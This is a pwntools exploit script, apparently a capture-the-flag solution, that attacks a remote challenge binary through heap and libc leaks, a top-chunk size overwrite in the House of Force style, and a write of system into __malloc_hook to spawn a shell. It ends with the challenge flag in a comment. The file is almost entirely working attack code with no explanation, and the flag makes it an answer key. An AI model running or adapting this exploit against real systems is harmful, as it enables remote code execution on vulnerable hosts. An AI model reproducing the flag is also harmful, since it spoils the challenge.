#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 10679 chal_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 10679)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x00401410
b *0x0040145e
b *vuln+344
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

io = start()

def alloc(size, data):
    io.sendlineafter(b'size >>>', str(size))
    io.sendlineafter(b'motto >>>', data)
    io.recvuntil(b'securely at : ')
    heap_leak = int(io.recvline().rstrip(), 16)
    io.recvuntil(b'motto : ')
    libc_leak = int(io.recvline().rstrip(), 16)
    return heap_leak, libc_leak

hleak, lleak = alloc(0x20, b'A'*0x28+p64(0xffffffffffffffff))
print(f'[+] heap leak: {hex(hleak)}')
print(f'[+] libc leak: {hex(lleak)}')

libc_base = lleak - 0x44390
heap_base = hleak - 608
printf = libc_base + 413248
malloc_hook = libc_base + 4111408
calc = (malloc_hook-0x10) - (heap_base+0x20) - 0x10 -608
#calc = 0xffffffffffffffff-exe.got['puts']
system = libc_base + 324643
#og = libc_base + 0x4f2a5
#og = libc_base + 0x4f302
#og = libc_base + 0x10a2fc
#og = libc_base + 0xe534f
#og = libc_base + 0xe54f7
#og = libc_base + 0xe54fe
og = libc_base + 0xe5502
binsh = libc_base + 1785224

print(f'[+] libc base: {hex(libc_base)}')
print(f'[*] malloc hook: {hex(malloc_hook)}')
print(f'[*] heap base: {hex(heap_base)}')
print(f'[*] printf: {hex(printf)}')
print(f'[*] calc: {hex(calc)}')
print(f'[*] system: {hex(system)}')


hleak, lleak = alloc(calc, p64(0xdeadbeef))
print(f'[+] heap leak: {hex(hleak)}')
print(f'[+] libc leak: {hex(lleak)}')

hleak, lleak = alloc(0x10, p64(system))
print(f'[+] heap leak: {hex(hleak)}')
print(f'[+] libc leak: {hex(lleak)}')

io.sendlineafter(b'size >>>', str(binsh))

#hleak, lleak = alloc(binsh, b'\x00')
#print(f'[+] heap leak: {hex(hleak)}')
#print(f'[+] libc leak: {hex(lleak)}')


io.interactive()
# uscg{medals_r_made_0ut_0f_sw3at_bl00d_and_t3ars}
